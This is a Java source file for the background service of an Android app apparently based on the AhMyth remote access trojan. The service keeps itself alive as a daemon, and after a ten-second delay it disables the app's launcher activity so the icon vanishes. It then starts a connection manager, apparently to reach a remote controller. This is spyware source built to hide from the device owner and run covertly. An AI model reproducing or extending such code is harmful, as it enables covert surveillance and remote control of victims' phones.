package ahmyth.mine.king.ahmyth;


import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;
import com.xdandroid.hellodaemon.AbsWorkService;
import java.util.Timer;
import java.util.TimerTask;
import io.reactivex.disposables.Disposable;


public class MainService extends AbsWorkService {
    private static Context contextOfApplication;
    public static boolean sShouldStopService;
    public static Disposable sDisposable;
    @Override
    public void onServiceKilled(Intent rootIntent) {
    }
    public static void stopService() {
        //我们现在不再需要服务运行了, 将标志位置为 true
        sShouldStopService = true;
        //取消对任务的订阅
        if (sDisposable != null) sDisposable.dispose();
        //取消 Job / Alarm / Subscription
        cancelJobAlarmSub();
    }
    @Override
    public Boolean shouldStopService(Intent intent, int flags, int startId) {
        return sShouldStopService;
    }
    @Override
    public IBinder onBind(Intent intent, Void v) {
        return null;
    }
    @Override
    public Boolean isWorkRunning(Intent intent, int flags, int startId) {
        //若还没有取消订阅, 就说明任务仍在运行.
        return sDisposable != null && !sDisposable.isDisposed();
    }
    @Override
    public void stopWork(Intent intent, int flags, int startId) {
        stopService();
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }
    @Override
    public void startWork(Intent intent, int flags, int startId) {
        contextOfApplication = this;
        Log.d("Ahmyth","start service");
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (MainActivity.MainActivityInstance!=null)
                {
                    PackageManager p=getPackageManager();
                    p.setComponentEnabledSetting(MainActivity.MainActivityInstance.getComponentName(),
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP);
                    MainActivity.MainActivityInstance.finish();
                }
                ConnectionManager.startAsync(contextOfApplication);
            }},10000);//延时10s执行

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //unregisterReceiver(mOnepxReceiver);
    }
    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }
}
